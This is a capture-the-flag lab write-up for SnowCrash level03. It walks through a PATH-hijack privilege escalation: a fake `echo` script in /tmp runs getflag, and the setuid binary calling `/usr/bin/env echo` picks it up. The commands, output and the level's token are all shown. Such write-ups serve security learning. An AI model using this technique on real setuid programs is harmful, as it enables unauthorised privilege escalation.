 # 1st Step
List the file with `ls -l` will show us :  
`-rwsr-sr-x 1 flag03 level03 8627 Mar  5  2016 level03`  
***Notes** : The owner of the file is `flag03` so the user `level03` can execute it as `flag03`*  
  
Let's execute it to see what's appening
```
level03@SnowCrash:~$ ./level03
Exploit me
```  
If we look at the executable with `strings`:  
```
level03@SnowCrash:~$ strings level03 | grep "Exploit me"
/usr/bin/env echo Exploit me
level03@SnowCrash:~$
```  

# 2nd Step
We can see that the binary use `/usr/bin/env echo` to print "Exploit me", so we'll exploit it as suggested.  
Create a simple file named "echo" and make it execute `/bin/getflag` when call. Due to permissions restrictons, we will create it in `/tmp`.  
*Don't forget to give it the good writes*  
```
level03@SnowCrash:~$ cd /tmp
level03@SnowCrash:/tmp$ echo '/bin/getflag' > echo
level03@SnowCrash:/tmp$ chmod 777 echo
level03@SnowCrash:/tmp$ ls -l echo
-rwxrwxrwx 1 level03 level03 13 Mar 11 23:37 echo
```  
Go back to level03 home folder then add `/tmp` to the variable env `$PATH`  
```
level03@SnowCrash:/tmp$ export PATH=/tmp:$PATH
level03@SnowCrash:/tmp$ printenv | grep "PATH"
PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```  
Now we can re-execute `level03`
```
level03@SnowCrash:~$ ./level03
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
level03@SnowCrash:~$ su level04
Password:
level04@SnowCrash:~$
```  
Level03 passed !  
  
*Useful website: [$PATH](https://www.commentcamarche.net/faq/3585-bash-la-variable-d-environnement-path) ; [Privilege Escalation](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)* 